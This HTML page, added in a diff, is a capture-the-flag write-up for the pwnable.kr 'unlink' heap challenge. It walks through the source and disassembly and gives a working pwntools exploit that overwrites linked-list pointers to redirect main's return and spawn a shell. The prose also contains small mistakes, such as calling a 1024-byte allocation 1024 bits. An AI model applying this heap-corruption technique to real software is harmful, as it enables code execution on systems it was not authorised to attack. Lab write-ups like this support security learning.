@@ -1,0 +1,137 @@
+<head>
+    <title>pwnable.kr - unlink writeup</title>
+</head>
+
+<body>
+    <p style="display: block; white-space: pre-wrap;">
+    So let's start by looking at the source code:
+
+    <code style="display: block; white-space: pre-wrap;">
+        #include &lt;stdio.h&gt;
+        #include &lt;stdlib.h&gt;
+        #include &lt;string.h&gt;
+        typedef struct tagOBJ{
+        struct tagOBJ* fd;
+        struct tagOBJ* bk;
+        char buf[8];
+        }OBJ;
+
+        void shell(){
+        system("/bin/sh");
+        }
+
+        void unlink(OBJ* P){
+        OBJ* BK;
+        OBJ* FD;
+        BK=P-&gt;bk;
+        FD=P-&gt;fd;
+        FD-&gt;bk=BK;
+        BK-&gt;fd=FD;
+        }
+        int main(int argc, char* argv[]){
+        malloc(1024);
+        OBJ* A = (OBJ*)malloc(sizeof(OBJ));
+        OBJ* B = (OBJ*)malloc(sizeof(OBJ));
+        OBJ* C = (OBJ*)malloc(sizeof(OBJ));
+
+        // double linked list: A &lt;-&gt; B &lt;-&gt; C
+        A-&gt;fd = B;
+        B-&gt;bk = A;
+        B-&gt;fd = C;
+        C-&gt;bk = B;
+
+        printf("here is stack address leak: %p\n", &amp;A);
+        printf("here is heap address leak: %p\n", A);
+        printf("now that you have leaks, get shell!\n");
+        // heap overflow!
+        gets(A-&gt;buf);
+
+        // exploit this unlink!
+        unlink(B);
+        return 0;
+        }
+    </code>
+
+    So we start by TYPEDEFing a struct OBJ. This struct has 3 fields: A forward pointer, A backwards pointer and an 8 bytes buffer.
+
+    This effectively creates a doubly linked list. Now, we define a shell function which just gives you a shell. So the goal of this challenge is probably to call this function.
+    the unlink function unlinks an OBJ from the doubly linked list. It creates two OBJs: bk and fd. bk is defined to be the previous object from P, and fd is defined to be the next object from P.
+    We set fd's backwards pointer to bk and bk's forward pointer to fd. Now, in  main we malloc 1024 bits = 1024 / 8 bytes = 128 bytes. We then make 3 objects: Objects A, B and C.
+
+    We then set A's forward pointer to B, B's backwards pointer to A, C's forward pointer to C and C's backwards pointer to B. This creates a linked list as follows:
+
+    <i style="display: block; white-space: pre-wrap;">
+        A &lt;-&gt; B &lt;-&gt; C
+    </i>
+
+    Now, we print the address of A, and the location on the heap malloc returned. Now we have a buffer overflow when calling the gets function. If you don't know why the gets function is dangerous, read my writeup on pwnable.kr's bof challenge.
+    We unlink B from the linked list, so it looks like this now:
+
+    <i style="display: block; white-space: pre-wrap;">
+        A &lt;-&gt; C
+    </i>
+
+    <h2>
+        So what's the vulnerability? 
+    </h2>
+
+    We can overflow A's buffer. So we can change B and C's pointers to whatever we want. Now, let's look at the assembly, Especially this part:
+
+    <code style="display: block; white-space: pre-wrap;">
+        0x080485f2 &lt;+195&gt;:	call   0x8048504 &lt;unlink&gt;
+        0x080485f7 &lt;+200&gt;:	add    $0x10,%esp
+        0x080485fa &lt;+203&gt;:	mov    $0x0,%eax
+        0x080485ff &lt;+208&gt;:	mov    -0x4(%ebp),%ecx
+        0x08048602 &lt;+211&gt;:	leave
+        0x08048603 &lt;+212&gt;:	lea    -0x4(%ecx),%esp
+        0x08048606 &lt;+215&gt;:	ret
+    </code>
+
+    In the source code, we just return. Note that ebp-0x4 is where the return address for main is. So ebp-0x4 should contain the shell return address, which we will save on the heap with the unlink function. If we do that, then we will return to shell.
+    So B's fd should be the address of shell that we save on the heap, B's bk should be return address of main and B's buf[-4] should be shell's address. 
+
+    Here's the exploit:
+
+    <code style="display: block; white-space: pre-wrap;">
+        from pwn import *
+
+        p = process("/home/unlink/unlink")
+
+        r = p.recvuntil("get shell!\n")
+
+        print(r)
+
+        stack_leak = r.partition('\n')[0]
+        stack_leak = stack_leak.replace("here is stack address leak: 0x", "")
+        stack_leak = int(stack_leak, 16)
+
+        heap_leak = r.splitlines()[1]
+        heap_leak = heap_leak.replace("here is heap address leak: 0x", "")
+        heap_leak = int(heap_leak, 16)
+
+        shell_address = 0x080484eb
+
+        pay = ""
+        pay += "\x90"*16 #Padding
+        pay += p32(heap_leak + 0x24)
+        pay += p32(stack_leak + 0x10)
+        pay += p32(shell_address)
+
+        p.send(pay)
+
+        p.interactive()
+    </code>
+
+    So we overwrite B's fd with the address of shell we save on the heap, B's bk with the return address of main and B's buf[-4] with shell's address. When we run this we get a shell:
+
+    <code style="display: block; white-space: pre-wrap;">
+        $ cd ~
+        $ cat flag
+        **************************
+    </code>
+
+    Great we solved it!
+
+    EOF
+    </p>
+</body>
